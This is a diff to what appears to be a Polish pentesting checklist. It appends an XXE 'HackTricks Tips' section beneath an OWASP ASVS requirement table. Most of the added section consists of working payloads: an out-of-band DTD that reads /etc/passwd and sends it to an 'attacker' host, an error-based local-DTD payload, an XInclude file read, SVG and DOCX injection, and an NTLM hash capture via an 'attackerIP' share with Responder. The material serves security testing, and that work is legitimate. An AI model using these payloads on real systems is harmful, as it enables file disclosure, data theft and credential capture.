@@ -173,3 +173,48 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V1.5.3 | Safe Deserialization | Verify that different parsers used in the application for the same data type (e.g., JSON parsers, XML parsers, URL parsers), perform parsing in a consistent way and use the same character encoding mechanism to avoid issues such as JSON Interoperability vulnerabilities or different URI or file parsing behavior being exploited in Remote File Inclusion (RFI) or Server-side Request Forgery (SSRF) attacks. |
+
+
+---
+
+## HackTricks Tips
+
+### OOB Exfil (blind XXE)
+
+Hostuj `malicious.dtd`:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
+%eval; %exfil;
+```
+Dla plików wieloliniowych użyj FTP exfil server.
+
+### Error-based (bez OOB) — System DTD Repurpose
+
+Gdy blokowane połączenia zewnętrzne — redefine entity z lokalnego DTD:
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x25; error SYSTEM &apos;file:///x/%file;&apos;>">
+    %eval; %error;'>
+  %local_dtd;
+]>
+```
+Szukaj exploitowalnych DTD: `dtd-finder` (GoSecure).
+
+### XInclude (bez kontroli DOCTYPE)
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+### Ukryte powierzchnie ataku
+
+- **SVG upload**: `<image xlink:href="file:///etc/hostname">`
+- **DOCX/XLSX**: unzip → inject XXE do `word/document.xml` → rezip
+- **jar:// (Java)**: slow HTTP server utrzymuje temp file na dysku → chain z LFI
+- **NTLM capture (Windows)**: `<!ENTITY xxe SYSTEM 'file:////attackerIP/share/x.jpg'>` + Responder
+- **Java directory listing**: `<!ENTITY xxe SYSTEM "file:///etc/">` — zwraca listę plików
